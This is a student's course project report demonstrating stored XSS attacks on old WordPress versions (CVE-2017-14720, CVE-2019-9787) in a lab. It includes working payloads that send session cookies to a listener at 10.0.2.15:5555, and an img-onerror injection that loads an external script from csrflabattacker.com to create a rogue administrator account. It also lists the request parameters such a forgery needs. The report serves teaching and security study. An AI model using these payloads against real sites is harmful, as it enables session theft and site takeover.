# Project
Jo Eun Kim\
ICSI 424 - 0001\
Amir Masoumzadeh\
2020-12-05

## Vulnerability #1: Cross Site Scripting (XSS) - simple one
### Brief Description of vulnerability
**CVE-2017-14720**\
Publish Date : 2017-09-23\
Vulnerable Wordpress Versions : Before 4.8.2

WordPress allowed a Cross-Site scripting attack in the template list view via a crafted template name. [(reference)](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2017-14720)

Before WordPress 4.8.2, $file_description and $description from wp-admin/theme-editor.php were not filtering the name of the template. It allowed an attacker to execute an XSS attack by placing XSS payload after "Template Name:".

### Significance
A lot of web development frameworks are using template engines. People benefits from the template engines are easily exposed to vulnerabilities. Cookies can indirectly become the cause of malicious activities involving victim's data and can be used to harvest personal information. For example, session ID can be used to login with administrative privileges. Attacker is able to bypass the security by placing the stolen seesion ID cookie, more easily by using a plugin in Firefox, and changing the cookie when he/she request it to get into a webpage with administrative priviliges the user, who's actually logged in there at the same time, holds.

### Design of Attack
Using WordPress 4.8

**Steal Session Cookie** by distributing a malicious template.\
As an attacker, we place a XSS payload in a template file. If we distribute the template file or theme consists of the file, we can have arbitary victims who use the template or the theme we distributed. The victim also can distribute the malicious template file without consent or the perception of it, which can results in more victims. We, attacker, can steal the victim's session cookie information when the victim tries to edit themes becuase the "custom-header.php" is loaded once the victim accesses to [Appearance > Editor].

### Demonstration of Attack
1. Selected a file we want to edit from [Appearance > Editor]
- I chose "custom-header.php" because it is loaded once the victim accesses to [Appearance > Editor], not the specific file.
![steal cookie-before](/V1%20wordpress%204.8%20version/steal%20cookie-before.PNG?raw=true "steal cookie-before")
2. Inserted XSS payload after "Template Name:", updated the file
- `/* Template Name: <script>new Image().src="http://10.0.2.15:5555?output_back_compate="+document.cookie;</script> */`
![steal cookie-after](/V1%20wordpress%204.8%20version/steal%20cookie-after.PNG?raw=true "steal cookie-after")
3. Listening the port 5555, was able to steal session cookie information once the page [Appearance > Editor] was loaded
- It does not matter which file the victim is editing. It does not have to be the malicious template (was originally back-compat.php). The JavaScript code is executed once the page [Appearance > Editor] is loaded. Therfore, the victim is being vulnerable while the malicious template is existing in the directory.
![steal cookie-result](/V1%20wordpress%204.8%20version/steal%20cookie-result.PNG?raw=true "steal cookie-result")


## Vulnerability #2-1: Cross Site Scripting (XSS) - simple one
### Brief Description of vulnerability
**CVE-2019-9787**\
Publish Date : 2019-03-14\
Vulnerable Wordpress Versions : Before 5.1.1

WordPress does not properly filter comment content, leading to Remote Code Execution by unauthenticated users in a default configuration. This occurs because CSRF protection is mishandled, and because Search Engine Optimization of A elements is performed incorrectly, leading to XSS. The XSS results in administrative access, which allows arbitrary changes to .php files. This is related to wp-admin/includes/ajax-actions.php and wp-includes/comment.php. [(reference)](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2019-9787)

### Significance
This vulnerability is more dangerous compared to the previous attack.
If a person, who downloaded the malicious template or theme distrubuted from the previous attack, has some knowledge of 




, the previous attack would be very limited and not so successful because he/she can see the XSS payload and remove it from the file. However, a XSS payload in comments is not visible to viewers. They do not have access to remove other's comments. They do not know what comments are there before they click the post. Therefore, a XSS attack placing the malicious code in comments is more dangerous.

### Design of Attack
Using WordPress 5.0

**Steal Session Cookie** by injecting XSS payload in comments.\
As an attacker, we place a JavaScript code in the comment of a post in a WordPress blog. Any individual, with and without an account, visits and views the post which the attacker left a comment consists of a malicious code becomes a victim. We, attacker, can steal the victim's session cookie information when there is a viewer.

### Demonstration of Attack
1. Embeded a JavaScript code (used in the earlier attack above) in the comment of a post
- `<script>new Image().src="http://10.0.2.15:5555?output="+document.cookie;</script>Love your post!`
![before comment](/V2%20wordpress%205.0%20version/steal%20cookie/before%20comment.PNG?raw=true "before comment")
2. Comment was added
- The malicious code is hidden.
![after comment](/V2%20wordpress%205.0%20version/steal%20cookie/after%20comment.PNG?raw=true "after comment")
3. A guest (without login) visits the website and views the post
- the malicious code is executed to get the guest's session cookie information.
![visit post as guest](/V2%20wordpress%205.0%20version/steal%20cookie/visit%20post%20as%20guest.PNG?raw=true "visit post as guest")
4. Listening the port 5555, was able to steal session cookie information
- Any visitor viewing the post including comments are victims.
![result](/V2%20wordpress%205.0%20version/steal%20cookie/result.PNG?raw=true "result")


## Vulnerability #2-2: Cross Site Scripting (XSS) - more complicated one
### Brief Description of vulnerability
As I proceeded launching XSS attacks, I noticed that the content of a post is also vulnerable in WordPress 5.0. As I checked that we can launch a XSS attack through comments, I would like to attempt to another XSS attack in another way-[through **posts**].

### Significance
Any users viewing the post become victims. When the victim happens to have admin rights, the attacker can exploit this vulnerability to gain control of the administrator's account, leverage the WordPress GetShell, then take the full control of the server.
### Design of Attack
Using WordPress 5.0

**Add a new administrator user** by posting a code that leads victims to execute a malicious file exists on attacker's webserver.\

In this attack, a user will gain a higher authority, administrative previlige. There are subscriber, contributor, author, editor, and administrator. We, as an attacker, will be an author who can write a post to the blog. The post will contain a shortcode that directs the user who viewed the post to visit the attacker's malicous website "http://www.csrflabattacker.com." The website consists of a malicious JavaScript program ([addNew2.js](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/addNew2.js?raw=true "JavaScript program file addNew2.js")). The JavaScript code will add a new WordPress administrator account to the blog, with predefined username and password the attacker chose. The account will be added on bahalf of an administrator as he/she views the malicious post.

1. Write and create the JavaScript file to add a new user account with whatever we want for username and password
- We can create an administrator user in our own blog to observe the HTTP Request using Web Developer Tool
2. Host the file on another website, which will be the attacker's.
- We can use one of the domain SEEDLab provides. I would use http://www.csrflabattacker.com that I used in our class labs.
3. Post a shortcode that will direct viewers to execute the JavaScript file (Injecting the malicious script>
- Viewers will quickly visit the front-end of the website while they are viewing the post,
- And the malicious JavaScript code will be silently triggered in the background.
- It is important to make sure that the appropriate part of the shortcode (content of post) is recognized and interpretated as an HTML tag and is rendered by the browser.
- Use &gt (greater than) and &lt (less than) for angle brackets **>, <**. 

A JavaScript program file [addNew2.js](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/addNew2.js?raw=true "JavaScript program file addNew2.js") used to launch the attack

### Demonstration of Attack
1. Observed HTTP GET Request - URL
- Created a new administrator user filling out required fields: username="typedUsername", email="typedEmail@gmail.com", password="typedPassword", role=administrator. 
- If the attacker has his/her own wordpress blog, he/she can easily observe HTTP Requests using the blog before launcing an attack.
- Request URL should be `/wp-admin/user-new.php`
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/GET.PNG?raw=true "GET")
2.  Observed HTTP POST Request - URL
- Request URL should be `/wp-admin/user-new.php`
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/POST.PNG?raw=true "POST")
3. Observed HTTP POST Request - Parameters
- Required parameters for a POST request to add a new user
 1) _wpnonce_create-user - secret value '_wpnonce_create-user' would be obtained from the GET Request
 2) action - createuser
 3) user_login (username) - username
 4) email
 5) pass1 -password
 6) pass2 -password
 7) role
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/Post%20param.PNG?raw=true "Post param")
4. Wrote a malicious JavaScript code ([addNew2.js](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/addNew2.js?raw=true "JavaScript program file addNew2.js")), hosted the file on the attacker's webserver
- used SEEDLab domain-"http://www.csrflabattacker.com".
- the JavaScript code will add a new WordPress account with the username="attacker", email="attacker@gmail.com", password="attacker", role=**administrator**.\
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/attacker's-website.PNG?raw=true "attacker's-website")
5. Created a new non-administrative user, made sure the user has no right to add a user
- I chose [Author], who has the right to post but not to add a user.
- The author is the attacker in this scenario.
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/author-rights.PNG?raw=true "author-rights")
6. As an author, the attacker was posting a malicious code (Shortcode) 
- that directs the victim to visit the attacker's malicous website "http://www.csrflabattacker.com" consists of the malicious JavaScript program ([addNew2.js](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/addNew2.js?raw=true "JavaScript program file addNew2.js")).
- `"&gt;&lt;img src=1 onerror="javascript&colon;(function () { var url = 'http://www.csrflabattacker.com/addNew2.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();"&gt;`
- It is same as `<shortcode>`**`>`** **`<img src=1 ....document.body.appendChild(bf);}})();>`**`</shortcode>`
- Because of the **`>`** before `<img>` tag, `<img src=1...document.body.appendChild(bf);}})();>` is recognized and interpretated as an html tag and is rendered/executed by the browser 
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/author-posting.PNG?raw=true "author-posting")
7. The attacker posted the code, others cannot see the contents
- When the victim is an administrator, the code will add a new administrator user.
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/author-post-done.PNG?raw=true "author-post-done")
8. As an administrator, viewed the attacker's post
- The code should be executed and a new administrator user should be added at this point.
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/admin-view-post.PNG?raw=true "admin-view-post")
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/viewing-post.PNG?raw=true "viewing-post")
10. "attacker", as an **administrator**, was added to Users
- Now, the attacker can use this account having the administrative control to the blog as he/she knows its username and password.
- (Note that the screenshot was taken when the email was set to attacker@site.com instead of attacker@gamil.com)
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/result-added.PNG?raw=true "result-added")
11. Checked if the attacker can login to the new account
- Username="attacker", password="attacker".\
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/login-to-attacker.PNG?raw=true "login-to-attacker")
12. Attacker was successfully loged in to the account
![image-title](/V2%20wordpress%205.0%20version/add%20a%20new%20admin%20user/[screenshots]add-a-new-admin-user/attacker-login-success.PNG?raw=true "attacker-login-success")

